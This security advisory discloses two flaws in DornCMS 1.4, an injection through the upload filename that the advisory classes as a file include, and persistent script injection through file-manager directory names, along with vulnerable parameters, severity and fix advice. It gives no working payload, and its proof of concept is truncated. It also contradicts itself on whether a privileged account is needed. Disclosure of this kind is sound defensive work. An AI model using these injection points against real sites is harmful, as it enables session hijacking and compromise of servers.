Discovery Status:
=================
Published


Affected Product(s):
====================
SourceForge
Product: DornCMS - Web Application 1.4


Exploitation Technique:
=======================
Remote


Severity Level:
===============
High


Technical Details & Description:
================================
1.1
A file include and a post inject vulnerability are detected in the Dorn Content Management System v1.4 web-application.
The file include web vulnerability allows remote attackers to inject files with malicious context via POST method.

The vulnerability is located in the `Upload` module in the Browse File section. Remote attackers are able to manipulate
in the upload POST method request the filename value. The code or commands as filename executes in the index module file
dir listing. In the exploitation phase the vulnerability allows an attacker to combine the script code inject with the
file/path request for unauthorized access.

Exploitation of the local file include web vulnerability requires no user interaction or privileged application user
account with password. Successful exploitation of the vulnerability results in unauthorized local file and path requests
to compromise the device or application.

Request Method(s):
				[+] [POST]

Vulnerable Module(s):
				[+] Upload > Browse File

Vulnerable Parameter(s):
				[+] filename (name)

Affected Module(s):
				[+] File Manager - File Dir Listing



1.2
A persistent input validation web vulnerability is detected in the Dorn Content Management System v1.4 web-application.
The bug allows an attacker (remote) to implement/inject malicious script code on the application side (persistent) of the device.

The vulnerability is located in the file manager module. The file manager module allows the user to include regular files to the
web-server system. Attackers are able to inject own malicious script codes as file name by tampering the upload POST method request.
The execution of the code occurs in the file manager data list in the left bar. After the inject the code will be permanent executed
and its not possible to delete via application function.

Exploitation of the persistent web vulnerability requires low user interaction and a privileged web-application user account.
Successful exploitation of the vulnerability can lead to persistent session hijacking (customers), account steal via persistent
web attacks, persistent phishing or stable (persistent) certificate mail notification context manipulation.

Request Method(s):
				[+] [POST]

Vulnerable Module(s):
				[+] Add Sub Directory (FileManager)

Vulnerable Parameter(s):
				[+] directory - name

Affected Module(s):
				[+] File Manager Folder Listing



Proof of Concept (PoC):
=======================
1.1
The local file include web vulnerability can be exploited by remote attackers with privileged application user account
and without user interaction. For demonstration or reproduce ...


Vulnerable Module: 	Upload > Browse File
Affected: 		Current Directory: files/ name as path value



PoC: Upload > Browse File - files/ Name

Solution - Fix & Patch:
=======================
1.1
Restrict the upload function and input by a secure escape and clean parse to ensure no execution occurs.
Filter and parse also the main folder name listing were the output is executed.

1.2
The second vulnerability can be patched by a secure restriction and encode of the add sub directory function in the file manager module.
Parse also the vulnerable output in the file manager listing even if the input is already encoded.


Security Risk:
==============
1.1
The security risk of the local file include web vulnerability is estimated as high(+).

1.2
The security risk of the persistent input validation web vulnerability is estimated as medium(+).
